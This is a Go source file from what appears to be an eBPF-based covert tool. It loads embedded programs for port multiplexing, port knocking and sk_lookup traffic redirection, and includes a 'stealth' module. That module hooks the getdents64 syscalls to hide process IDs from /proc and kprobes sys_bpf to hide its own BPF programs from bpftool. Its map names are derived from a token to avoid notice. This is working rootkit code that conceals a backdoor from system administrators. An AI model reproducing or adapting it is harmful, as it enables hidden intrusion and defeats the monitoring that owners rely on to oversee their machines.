package bpf

import (
	"bytes"
	"log"
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

// ensureBpfFs 部分发行版不默认挂载 bpffs, 自动挂载 /sys/fs/bpf (幂等)
func ensureBpfFs() {
	if data, err := os.ReadFile("/proc/mounts"); err == nil &&
		strings.Contains(string(data), " /sys/fs/bpf ") {
		return
	}
	os.MkdirAll("/sys/fs/bpf", 0755)
	exec.Command("mount", "-t", "bpf", "bpf", "/sys/fs/bpf").Run()
}

//go:embed portmux.bpf.o
var BPFELF []byte

//go:embed stealth.bpf.o
var StealthELF []byte

var (
	CfgMapName     = "pc_" + Token
	WatchMapName   = "pw_" + Token
	SockMapName    = "ps_" + Token
	KnockMapName   = "kn_" + Token
	SecMain        = "sec_" + Token
	SecLegacy      = "secl_" + Token
	ProgName       = "pi_" + Token
	ProgLegacy     = "pl_" + Token
	HiddenPidsMap  = "hp_" + Token
	HiddenProgsMap = "hg_" + Token
	DirBufsMap     = "db_" + Token
	ProgStateMap   = "pg_" + Token
	FnTpEnter      = "se_" + Token
	FnTpExit       = "sx_" + Token
	FnTpExit2      = "sy_" + Token
	FnKpEnter      = "ke_" + Token
	FnKpExit       = "kx_" + Token
	TupleMapName   = "pt_" + Token
	FnSkLookup     = "sk_" + Token
)

// mapPinPaths iproute2 tc 的 libbpf 把 PIN_BY_NAME 的 map pin 到
// /sys/fs/bpf/tc/globals/<map名>, 老版本在 /sys/fs/bpf/<map名>
func mapPinPaths(name string) []string {
	return []string{
		"/sys/fs/bpf/tc/globals/" + name,
		"/sys/fs/bpf/" + name,
	}
}

func LoadPinnedMap(name string) (*ebpf.Map, error) {
	for _, p := range mapPinPaths(name) {
		m, err := ebpf.LoadPinnedMap(p, nil)
		if err == nil {
			return m, nil
		}
	}
	return nil, fmt.Errorf("pinned map %s not found", name)
}

// LoadPinnedMaps 加载三张核心 map (确定性, 一定是 tc 程序正在用的实例)
func LoadPinnedMaps() (cfg, watch, sock *ebpf.Map, err error) {
	ensureBpfFs()
	cfg, err = LoadPinnedMap(CfgMapName)
	if err != nil {
		return nil, nil, nil, err
	}
	watch, err = LoadPinnedMap(WatchMapName)
	if err != nil {
		cfg.Close()
		return nil, nil, nil, err
	}
	sock, err = LoadPinnedMap(SockMapName)
	if err != nil {
		cfg.Close()
		watch.Close()
		return nil, nil, nil, err
	}
	return cfg, watch, sock, nil
}

// FindMaps 按派生名扫描系统 map (兼容老 tc 无 pin 时)
func FindMaps() (cfg, watch, sock *ebpf.Map, err error) {
	ensureBpfFs()
	find := func(name string) *ebpf.Map {
		var id ebpf.MapID
		for {
			next, e := ebpf.MapGetNextID(id)
			if e != nil {
				break
			}
			id = next
			m, e := ebpf.NewMapFromID(id)
			if e != nil {
				continue
			}
			info, e := m.Info()
			if e == nil && info.Name == name {
				return m
			}
			m.Close()
		}
		return nil
	}
	cfg = find(CfgMapName)
	watch = find(WatchMapName)
	sock = find(SockMapName)
	if cfg == nil || watch == nil || sock == nil {
		if cfg != nil {
			cfg.Close()
		}
		if watch != nil {
			watch.Close()
		}
		if sock != nil {
			sock.Close()
		}
		return nil, nil, nil, fmt.Errorf("maps not found")
	}
	return cfg, watch, sock, nil
}

// UnpinMaps 删除 bpffs 上的 pin (清理时调用)
func UnpinMaps() {
	for _, name := range []string{CfgMapName, WatchMapName, SockMapName, KnockMapName} {
		for _, p := range mapPinPaths(name) {
			os.Remove(p)
		}
	}
}

// SkLookupObjects sk_lookup 转向程序 (内核 socket 查找层原生转向, 无 iptables)
type SkLookupObjects struct {
	prog *ebpf.Program
	coll *ebpf.Collection
	link link.Link
}

// LoadSkLookup 加载 sk_lookup 程序并挂到当前 netns。
// 程序引用的 map 与 tc 加载的程序共享: 把 tc/globals 下的 pinned map
// 再 pin 到根路径 (cilium 加载时按 /sys/fs/bpf/<name> 复用)。
func LoadSkLookup() (*SkLookupObjects, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(BPFELF))
	if err != nil {
		return nil, fmt.Errorf("parse spec: %w", err)
	}
	// 只加载 sk_lookup 程序, 其余程序删除
	for name := range spec.Programs {
		if name != FnSkLookup {
			delete(spec.Programs, name)
		}
	}
	if spec.Programs[FnSkLookup] == nil {
		return nil, fmt.Errorf("sk_lookup program %s not found", FnSkLookup)
	}

	// 用 tc 加载的 pinned map 实例替换引用 (共享同一组 map)
	replacements := map[string]*ebpf.Map{}
	for _, name := range []string{CfgMapName, WatchMapName, SockMapName, KnockMapName, TupleMapName} {
		m, err := LoadPinnedMap(name)
		if err != nil {
			return nil, fmt.Errorf("map %s: %w", name, err)
		}
		replacements[name] = m
		// 根路径 pin 备用 (幂等)
		_ = m.Pin("/sys/fs/bpf/" + name)
		defer m.Close()
	}

	coll, err := ebpf.NewCollectionWithOptions(spec, ebpf.CollectionOptions{
		MapReplacements: replacements,
	})
	if err != nil {
		return nil, fmt.Errorf("load sk_lookup collection (spec type=%v): %w", spec.Programs[FnSkLookup].Type, err)
	}
	prog := coll.Programs[FnSkLookup]
	if prog == nil {
		coll.Close()
		return nil, fmt.Errorf("sk_lookup program missing after load")
	}

	netns, err := os.Open("/proc/self/ns/net")
	if err != nil {
		coll.Close()
		return nil, fmt.Errorf("open netns: %w", err)
	}
	defer netns.Close()
	l, err := link.AttachNetNs(int(netns.Fd()), prog)
	if err != nil {
		coll.Close()
		return nil, fmt.Errorf("attach sk_lookup: %w", err)
	}
	return &SkLookupObjects{prog: prog, coll: coll, link: l}, nil
}

func (s *SkLookupObjects) Close() {
	if s.link != nil {
		s.link.Close()
	}
	if s.prog != nil {
		s.prog.Close()
	}
	if s.coll != nil {
		s.coll.Close()
	}
}

// FindProgramIDs 枚举本工具的 BPF 程序 ID (供 stealth 从 bpftool 枚举中隐藏)
func FindProgramIDs() []ebpf.ProgramID {
	var ids []ebpf.ProgramID
	var id ebpf.ProgramID
	for {
		next, err := ebpf.ProgramGetNextID(id)
		if err != nil {
			break
		}
		id = next
		prog, err := ebpf.NewProgramFromID(id)
		if err != nil {
			continue
		}
		info, err := prog.Info()
		prog.Close()
		if err != nil {
			continue
		}
		if info.Name == ProgName || info.Name == ProgLegacy {
			ids = append(ids, id)
		}
	}
	return ids
}

// StealthObjects /proc 进程与 BPF 程序枚举隐藏模块
type StealthObjects struct {
	progs         []*ebpf.Program
	links         []link.Link
	colls         []*ebpf.Collection // 承载替换 map 的最小 collection, 保持存活
	maps          map[string]*ebpf.Map
	HiddenPids    *ebpf.Map
	HiddenProgs   *ebpf.Map
	bpfProgHiding bool // kprobe 隐藏是否启用 (部分内核 lockdown 拒绝)
}

func LoadStealth() (*StealthObjects, error) {
	spec, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(StealthELF))
	if err != nil {
		return nil, fmt.Errorf("parse stealth spec: %w", err)
	}
	s := &StealthObjects{maps: make(map[string]*ebpf.Map)}

	// 先创建全部 map: 单程序加载 (ebpf.NewProgram) 时程序内的 map 引用
	// 无法解析会直接失败 —— 之前因此所有 stealth 程序都加载失败、
	// 只有 map 建成, "已启用" 成了假象。用最小 collection + MapReplacements
	// 逐个加载程序, 既解析 map 又保持单程序失败的宽容性。
	repl := map[string]*ebpf.Map{}
	for _, ms := range spec.Maps {
		m, err := ebpf.NewMap(ms)
		if err != nil {
			continue
		}
		s.maps[ms.Name] = m
		repl[ms.Name] = m
	}

	loadProg := func(name string) *ebpf.Program {
		ps := spec.Programs[name]
		if ps == nil {
			return nil
		}
		mini := &ebpf.CollectionSpec{
			Programs: map[string]*ebpf.ProgramSpec{name: ps},
			Maps:     spec.Maps,
		}
		coll, err := ebpf.NewCollectionWithOptions(mini, ebpf.CollectionOptions{
			MapReplacements: repl,
			Programs: ebpf.ProgramOptions{
				LogLevel: 1,
				LogSize:  1 << 20,
			},
		})
		if err != nil {
			log.Printf("stealth: 程序 %s 加载失败: %v", name, err)
			return nil
		}
		s.colls = append(s.colls, coll)
		return coll.Programs[name]
	}

	tpEnter := loadProg(FnTpEnter)
	tpExit := loadProg(FnTpExit)
	tpExit2 := loadProg(FnTpExit2)
	kpEnter := loadProg(FnKpEnter)
	kpExit := loadProg(FnKpExit)

	// 尾调用接力: sx_ → sy_ → sx_ ... (每条各处理 CHUNK 条, 规避单程序跳数上限)
	if tpExit != nil && tpExit2 != nil {
		if tails, ok := s.maps["pt_"+Token]; ok {
			k0, k1 := uint32(0), uint32(1)
			if err := tails.Update(&k0, uint32(tpExit.FD()), ebpf.UpdateAny); err != nil {
				log.Printf("stealth: tails[0] 更新失败: %v", err)
			}
			if err := tails.Update(&k1, uint32(tpExit2.FD()), ebpf.UpdateAny); err != nil {
				log.Printf("stealth: tails[1] 更新失败: %v", err)
			}
		}
	}

	if tpEnter != nil {
		if l, err := link.Tracepoint("syscalls", "sys_enter_getdents64", tpEnter, nil); err == nil {
			s.links = append(s.links, l)
			log.Printf("stealth: getdents64 enter(tp) 挂载成功")
		} else {
			log.Printf("stealth: getdents64 enter(tp) 挂载失败: %v", err)
		}
	}
	if tpExit != nil {
		if l, err := link.Tracepoint("syscalls", "sys_exit_getdents64", tpExit, nil); err == nil {
			s.links = append(s.links, l)
			log.Printf("stealth: getdents64 exit(tp) 挂载成功 (尾调用接力已配置)")
		} else {
			log.Printf("stealth: getdents64 exit(tp) 挂载失败: %v", err)
		}
	}
	if kpEnter != nil && kpExit != nil {
		if l, err := link.Kprobe("__x64_sys_bpf", kpEnter, nil); err == nil {
			if l2, err2 := link.Kretprobe("__x64_sys_bpf", kpExit, nil); err2 == nil {
				s.links = append(s.links, l, l2)
				s.bpfProgHiding = true
				log.Printf("stealth: BPF 枚举隐藏挂载成功")
			} else {
				l.Close()
				log.Printf("stealth: kretprobe 挂载失败 (内核限制): %v", err2)
			}
		} else {
			log.Printf("stealth: kprobe 挂载失败: %v", err)
		}
	}

	s.HiddenPids = s.maps[HiddenPidsMap]
	s.HiddenProgs = s.maps[HiddenProgsMap]
	if s.HiddenPids == nil || s.HiddenProgs == nil {
		s.Close()
		return nil, fmt.Errorf("stealth maps not found")
	}
	return s, nil
}

// HidePid 把 pid 加入 getdents64 隐藏列表
func (s *StealthObjects) HidePid(pid uint32) {
	if s == nil || s.HiddenPids == nil {
		return
	}
	for i := uint32(0); i < 4; i++ {
		var cur uint32
		if err := s.HiddenPids.Lookup(&i, &cur); err != nil || cur == 0 {
			if err := s.HiddenPids.Update(&i, &pid, ebpf.UpdateAny); err == nil {
				return
			}
		}
	}
}

// HideProg 把 BPF 程序 id 加入枚举隐藏列表
func (s *StealthObjects) HideProg(id uint32) {
	if s == nil || s.HiddenProgs == nil || !s.bpfProgHiding {
		return
	}
	for i := uint32(0); i < 4; i++ {
		var cur uint32
		if err := s.HiddenProgs.Lookup(&i, &cur); err != nil || cur == 0 {
			_ = s.HiddenProgs.Update(&i, &id, ebpf.UpdateAny)
			return
		}
	}
}

func (s *StealthObjects) Close() {
	for _, l := range s.links {
		l.Close()
	}
	s.links = nil
	for _, p := range s.progs {
		p.Close()
	}
	s.progs = nil
	for _, c := range s.colls {
		c.Close()
	}
	s.colls = nil
	for _, m := range s.maps {
		m.Close()
	}
	s.maps = nil
}
